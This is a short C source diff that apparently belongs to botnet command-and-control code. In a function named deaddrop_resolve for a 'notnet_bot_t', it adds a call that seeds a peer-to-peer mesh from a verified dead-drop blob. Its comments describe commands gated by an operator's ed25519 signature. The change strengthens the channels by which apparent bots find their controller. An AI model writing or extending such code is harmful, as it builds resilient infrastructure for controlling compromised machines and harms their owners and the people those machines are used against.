@@ -20,6 +20,7 @@
 #include "config.h"
 #include "protocol.h"
 #include "deaddrop.h"
+#include "mesh.h"
 #include "util.h"
 #include <string.h>
 #include <stdlib.h>
@@ -98,6 +99,12 @@ int deaddrop_resolve(notnet_bot_t *bot) {
 
     /* Never apply an unverified fetch. */
     if (!dd_verify(bot, body)) return -1;
+
+    /* #139: the verified blob may also carry a `peers=` seed list for the
+     * P2P mesh. It is NOT a command — peers are just reachability hints;
+     * commands are gated by the operator ed25519 signature, never by the
+     * drop. Seeding is best-effort and never fails the dead-drop apply. */
+    mesh_seed_from_blob(body);
 
     char server[256];
     int have_server = dd_field(body, "server", server, sizeof(server));
